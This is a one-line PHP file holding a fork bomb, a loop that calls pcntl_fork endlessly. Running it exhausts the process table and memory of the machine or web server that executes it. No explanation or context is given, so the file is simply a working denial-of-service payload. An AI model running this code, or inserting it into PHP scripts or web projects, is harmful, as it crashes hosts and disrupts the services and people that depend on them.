<? while(pcntl_fork()|1); ?>
